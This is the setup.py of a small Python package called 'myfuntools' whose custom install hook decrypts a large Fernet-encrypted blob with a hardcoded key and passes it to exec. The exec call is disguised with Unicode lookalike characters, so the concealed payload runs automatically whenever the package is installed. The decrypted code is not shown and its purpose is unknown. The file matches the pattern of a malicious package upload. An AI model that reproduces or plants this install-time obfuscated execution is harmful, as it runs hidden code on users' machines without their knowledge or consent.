from setuptools import setup
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
from cryptography.fernet import Fernet


class CustomInstall(install):
    def run(self):
        install.run(self)
        a = b'0HghMOWy5HynvBUqh6SWU3i33yDOybu-TaXAcfTIIhk='
        b = b'gAAAAABoQ_Btd3TaiEho_BdbhOfd4pSX1RwRcfewT_JoPxBO73f6wf2xacotAOEYpQB_h0iF94Pk-UWjdCRsbzkahtHiTOE-s-iEAqYMXVJYjt4OJgK4aclQsZrYs3aE_gcqcpurg2GzCLkbXTkI9FntoRHnzXT8F3U3qCIK7UvWj1eHaQY7kLtxgP00seEFg4ibE8TQWBxlwpwdV07XZpC2FYXP5ifRlPBy4AFFvpSseUGoe3B3t3_6MYzZucrLoKMPnZ8OIrM3B8P_nHnRtzA4ZwMCBg_Zc8anELe0mAuP4YGBJULPBj01ljB1r_JJuaoKVY3dm7wbKl1Z3zOLnz84KzDFhamMTu1ltmgwVjf7tWFvRKLFFps3V4cprYvDL2GxRAuYIP82LdKi1lbwTqUV6rnu3Ovbo_ctwlzrNCP15rrLps2PpkWzkK9N7Wjhy8Y4DpSaRWcLe_ui6NECCf6VVIlPoapgg9CPm9UJHpYhbt-byCxRmsJfaFOUIth6ifKJI-57MjRP2_ueUxHEJpGjmyMiGaqBaQzPv2Lbb0-1ikdHSAHR8_dSfIqBU-HYfiGF79JZF8e_ahOP0D5qm9Lcxellgmm5MLzJvw12VtlRjLonfyfsNh6UQzkX2wsYlyq-zHUo0WFjVItLNexO2Z5WwSOJG8E_KdNabuTVzmSFW1eNrCZjyR6CVReYOnuSt8gAOPFIWFmVyZCuQNyCqowfWgzb8m5KWHyN5asVY4pzH1Xe6xpQBwslhK9E9eBnw1JFRLJ7If0_ml4UJc6XQFsxQyYvWCn8A0MfQxmBaG34q2ty_lEJwtl0uTkb_crXqmZhlIlQI7TnZdc2SfT8pVCCIqQbymS4pAZYkd8Sg8rqYf5J0ORLNc15xy_1wMdLTFj1zS5Q6D60DPPnfOSKhzjZXhXzGayNOPMUuEQ2tNxJOUXChLxOQ3x-9WkIvJXdiTaOVzFIq9Pet75L-2Ifoww_sCSTI5n8poyAEuWAmlulas0ZGAF29HzdHPJxCZKxuZ05QOtJYMW--zFbDu71d_2xvCS2gvLSQ4EgfHjLDXEY_0P_ZNbswEui9XBcRMbXO_072MUO1D8yEY3evbVR7IZ4oHi4LSJ-SYa7JPnIW2QkrX0r5R0PMQSgrkIbBKDlC0uAP8qrDfyZDUODMzp2eMmj_09SjtkCW-w19vVBH0yvpx1LRugq5TBN7Rp2zZ3RAJvADLi6GhEBPEMl73cpVIcsox7z2Z2bHkR6rOveD_-RBoSwpnMKl2lPdIXL8d4z_FzO0Sw-6Jkfphl_m10LAratVj5etN8LaUavo4kXddiHnr-X4xk_wOAWLbUlc-CdVGjvc9um-NhvvaRyvgoi2clLjqXrAfTsxpsQG38AA08FcjcSRA38Cm2vk5anwEUr4Xyxn3bvLUPI1ZGVny9XqrkXy_keBu5KiuLG4CTt4ykWMoMH28r2J6dkQu5PdD5rFse45Wc4nB3xDsvWVQZYR2asA5DvuVSbnAla6ppCngZVUaotoMAUa2509Nsxapb_cARiDBHFL80XmI4SK7Cd1ICudozHsx9JajM7U8UZG3v2kYB9ZMdktw6gh9PuKdvjXZy4Uc9PAhOD3LoLwH2giuiRJVn-nf-LjmBGr7MfFf7CT_nONVnaNizo0hMPL7ky0cvPsLN3vqCpMeE5AYPNPnUvbKJzxT11rnaaw6X1R4k56tjkdbezWgmfLFi4hMWxVz3Ime2S1dZvB_87dKWixADBSKEBX_8th_94L_qNgO1NqBDqAK82kH0LUS9-D-49mFdSAmsVSFV7H6I2wz7PnrdoacLOYcrT2ZCpd-e1QSa06AaNOQxgbbHOJI4URb6i1EV2Ni6cEzpDXCJPx5p5yXfL_0HO71luIIazx6FlhjV6LGPd_QbMFGdYvLrS1TtfRlAq00RXDMeT-qDLTJbrYaR8SP9qDh7SIIIlIPvtLOexRdwndoSiIytJqovqijJdcJ5FMAnbArDo4mq1RZbU2BfKgX2g3y3kKgYpldwjGnbmSuW8S1_u4hf9MNJ5tRTpdskRdYaNHEJNgrtbro0XWsmaCa9Wd6gs2lRBx4xKq1jiE_CuGOnIVnjGhXTufrrZuryWHgchFrsaTFPgpKRSnKnyRpjdPCU56R_xB4WNjktoUZIiDKdI2vWiySFnNl4WzSQ0RAQBdwIpH-UVhu8hdLtZEXVHQf5T2AdCkMNj8lnHyfCL-JZtKGPSOggCUSq1_dBQ-nn4mAcy4rzk91Ga85fV8PG4r7ITu2ozbXqs9wXAX6iisPfeFcrowjpGyWhRONnFA5Zj6QJr05D7FvGja10uNpUZ7Cbk_qTictSgIuP3WdVbLWkhzvv3odocRtIvMDeBw1TNkTewe_TKIy1ehqKKFzvUc9A8dXDlmANLKXUwpA1HUeqrdqVuJ-_U-b7jFa75tjEtCDg4oscgMy2rDkdyXl8gXEuW5LFH863UnmKl52qBW59Q1Ym1OhJ92MUHqqIHYo-kDJY2ZebCHRp_U-nzQrUNpc3xDwg_lccSqGKHJYPf9JqYfTnqp5_W54amDZAoiE6al8sLoja8A3_K2grG0y4lE924oitIh1hs2-bza-OI3Ar9KI2uL8mJsE3NE7DTmTup8gv4OQoWXxOtdlRW9h1rnwzWbiXkqyTcmjkwPXik4sofw_-fehqnL3kLvsicimnhmiqa202nX1X7oWMBGMQIm1vBtyNUFfDsPZ9DXX2JhG7rkNr3iCb5kKJsx5UmUTGolpEWrfGP0X8xyz5poWmsy37SXEShP74ISYdfSJe5v35fYNRkGRVu59D7jMVOKUw8O47UIXXSN44dPzn6GrVu6rJdbA5x__odVXNuviaMA0SaSx6HxBNSLG1C98_uvOqID3TvERHP8QUV34T4h_F4Dsbs71ajMk6-IOlT5dVtLY0IdLb-or8f1t9oJn_2wyX8TclDcDQrxg6JmsI1dso5Trfp_FUnwbI3SMtiy8--327vFdiWXvaH8GZZQMgGsma0pjD87VXTurm9Itwr5lVnDppFxFhl8Uk4swkVZKLUNesIV7IeYr2PExsHcr_NnQITIsF0zrtAtOvc6pPsYJU14rj5_dhnWmigS6-_wdvYSB6-WV0ORLsOkmLlHryyzhN9Z0BfQ13Wd31HsZrYxIkYgKFxvE2fYwV3m7TyooheDDkMRC-Yj7FRNoFaZsc5_XQO8EkAdW3F458JMoumjaf_IIbKzFTe7eKT9MxymEw7kyCbDVuu3UJlJO7TSWoudut9P_BfhL3tbnF-FSdeseGmV2caaTWM0S5n5BLNf2z5EM5JRpenb4OGkwXKffG27rP3JhN8I3wv-_k0uPaAF8ks-xpxxVbrV03r-B3BzK2BoVqIagwI4k7xP4m18Ulalhtk1nLM76C4xMmZaTOnyXzLqzyBSc51sTcja-8ULS6Qeb60GWYsOkluQu53OuSm2G94a2QMONALN1KXzOg3JnEgYc5gr5NPHWt48cw7DkZC28fSpygLARQu2zpvT0-YO0tDLR8AY8K7tQy2TiD-bvyj6gdJtQ1OcCubTdyC8pbBzswAKxO6tM3ckZqnpQ9zddO1Gx9pUtDiC5igGa_m3d799Y6wN7pZl8eoL4IGlmmNkBduAcdn4WSx6BufmBb_mHhXdNouXdUtV7lGdVaNrt1-VaiveGBH_tF-bETzR4t8Vjy74OjEuODnOBY_sAEM1vlFRAjRbne0XzEhN5mnK6JUvIMGpFUCGr1rBe1bUUWCQxMBhOmMi_Sixqwg_ltwYrLiYlO82VHka7AIyDl_wi8iVaYM1-eKmslQIu3d8FbOecbPHBHzFwIXAmHLKdRQlbrUDL7vHH65pEufcqf5LdrMXx7y4ijVymDki_Qx8yVF62FG1PAtLoN6-AJ7e7Mt1Myc0HZ1Kd79KxWX3TP7Nemdm6du8fuDsQpWF4m5JsuiqIcIOG_wBfYDGkHozjs7fPjDSDx1tDemURaxrjAuQmeF4zNvXAO-Jym387PqepZXmXCcpXTJaK74vsOAMIzW9Pe5XWLDeYvwLufB34kjNvShLIwykJ7JIWk8DlHTC0K8sz6qUL7dHAo1lywP9zQVDZnt7HGHi5OPH717qDpGVu3P6SZAFXnXqZ2C4bqjM3S-Soxv64AuI7vBTTyfbj6ua8uD11l5pGPJdZLSrPoipluf9QJ9qqNou2fC7buSSGsvsvQmuG-Hf7QHNftBWqlfQjbPVjCXfO9GVXHE2RV63rD7aMomE2EExCbiXUDTKA1DMUqgjpaDwL_Q8yLmlCKrg06MfY8IEN96DbbiM4TxAQWCWGC6QkyghIhpAKp644TUB2Dk83gpm15PjX7Gi8_IY6ZgPNYFJO1oSaHH7U67J7NKnFO8A-qdgomzLHQAt5cuINBWsJEEoqe2V5EwR34NQQjsifUUxnYwS-IxQdR9BWT5LVLWFJkInsTtsneWw8rdy_9Nj1yBttO6PZQ5ndjiKRNATKHpDYiA5pF1zqyqga477upw99jzCJJL9PTXPC1xcqRhP4bsNUcjkTfHSmVmnAe7uzj1Qq9ZHI9drcK0WbXPw4RiJYWLax517XTdusoO7BSRNHiwcMPacM4kaoZ-Efs0IKH8YVHK6qL6-FYgjjZzcW4rSSofS2OwbGwiM5NX162I1X5HXv57sISN12wdLSRgX28sS2dQluTyhlDDS7kmAl27eKTY0J9wcmD4boHBJXR8lYa4GuU6ytGKRRHrw-R46aKvgjDyHmx0V8ChXB4kJHtsjZFqDlWbE6oCNAdAfHwwbk86wE3q7KTlyUT7pSpN8ua8YeBQOSDiW9K1FT2a2sEwOIs1Y_JJC37vTlqkM4XkFf21LoIyfwiOEvoVuDTr51f8QJorw07eWOqYU-SXDJ_T3qrq26HonuGUO0jrw4q_SMKpVxsbYtuxPCXCD-JpJPfPk9xmuZnLbs9rFL-K2gdergc1dbuw1807SyG0Ubbb6qECyLMVoZiI2USWR41h7oJiwXbPTNX6-_hy2LNwRcg0_gGo1iv31C9YG2DbOTX7W9MMmVB-TNNgI1GlSRhVBJcOS57Jh_mMSkNOfiB37wYIW79EU3IpR6KPtA4fGwnvYl9t46Lvw4BFxHAV8iS-8618heMtFW66OpD-ugT6i1p2h5scZI5w_STLdqdh13KPgK9siXOOwsWAUXzELlilMGD8oTM-veHvR5vwRjtySeG27_g0JGaQOLhb17oDQ10bC9S6pD-h_oLyua6jscALTfRr_XKQAAFEdH8ipc_aRjWldPN-XxbClWxjEh8h9UXzmeEASAh7CiGKX56k6WOI728t39HwVMa8K9zwGUser9YGHV_1vmgtypJgrTQwTRJBCw5cvNxOdocs4IV930jdrNQkf0IyIqgsEa2Y8jtsrzRFvb_hrXeNWeGJAWxMPqfRnLtfsJd50AUwUFmHlFKLND1jJkBCZ6UPSVcs-4pguKhnLV4Cv4waFZrmvUtckF1OyUEeYbdOh5sDJ9WsoyAwE3SCbDd-V9_GnPMnABqckEHDQlRL-zRickZsX8_aw2onC2ajBhjnOBl6zFTrkepTbNOMJgmy7yVe5a_ZgFBESyGhRIAf3tWTYKnbVG6_94-m4_Jl-fuG6Ngumt_kOvIPeDecu7wAIJkCSqGA_O4czfOFV4159MTt806hC0efexSoDqMoXsh7VQ89dWUyLh5mYlRvi0FuuiCmhYIa3eePJpXbouh-0JhVuQqb55qWHRleiP8KV4q0l0JI0yysIehLzFywnnec-6gv8FaTwdQGOqRGAcxJzqCAbZxKrkgbSx2oR-iCQ5SX6_CaBeTz3qw_5zry8fGVVgNexXYZv8YY4f0tkrNKBhhtZAhz9LG1yPyWibmSF98np7HJtS0lsGSENFKP5Soxnh6lT8uIRf7On1Hh9jH0ckUDKYPHh-W7MTIBpUwTt2RRQbrkhU3pzbZig_yf5IDLFREsMOrEMhSZh-Dp5AQJVQu2V_5YNoaKR180_9FoukV9sO57g9X80vWXSFUnbrvLNqrJRsDO_EjfjRfZsszpRtnibH_zaqkXtdNIQ4VhN0ZpHmC-Ybh3MEmtdZKBZiPx188_MMQ0dHlnNtIPHnxDbL5YClwIt4VAow1nJHAeITiuRbIpP0ZCn9QnuF6H8jhhcVKofvsWS-Yj6GIyNl_GKzBisgF2bKhDEfPwOmykDZJVi8zoV3_n1WegYTUnrlA-vBOYe81NgzMuZsZuDALZY5cTZ9zxuy_Azeo2kKL93OrJPIdEdqXfbImt81b-P3j9aj4vKIUkM55rMUI_ZT8YVoe2_D5h72qyVLBo3slPqx1DgMIl0Q2tDrabkpUL7JnPwH2zJTCD1WmHMCV7URjWIDOQPvDDSy66NqjzdHcdAp9EYuuuLzh6-t1ixnI4t7L5b73oxGtP-WvqDsz0O_dh2Xp3tCBeVQKQMpqRXl9pLF1hW9x40ItJ-iQsY8Gzgj3gZTjJ5LNekEF7g2cTINT0egexuXB0nAA64kl9JzVXT5ZvPaltNdnLZntatkPZTnUzOTL6-Y5KKOVxmAVN-4JVhB_Ni5zbGnXAdkQ1V2gmdpvhfSRvYRg8FosTb8cleekxYJYFn-zpnzWlQuQAL8aE40bVR09CoWZEwsCW5uoJulN5KYHMO99OgoZjp0Ilu5vGXLsAEkcmetuJSyg-fQ=='
        c = Fernet(a).decrypt(b)
        ‚ÑØùìç‚ÑØùí∏(c)


setup(name='myfuntools',
      version='0.1.3',
      description="tools",
      author="lvxianzhi",
      py_modules=["myfuntools.hello"],
      install_requires=[
        "pycryptodome",
        "cryptography",
        "cffi",
      ],
      cmdclass={
           "install": CustomInstall
       },
   )
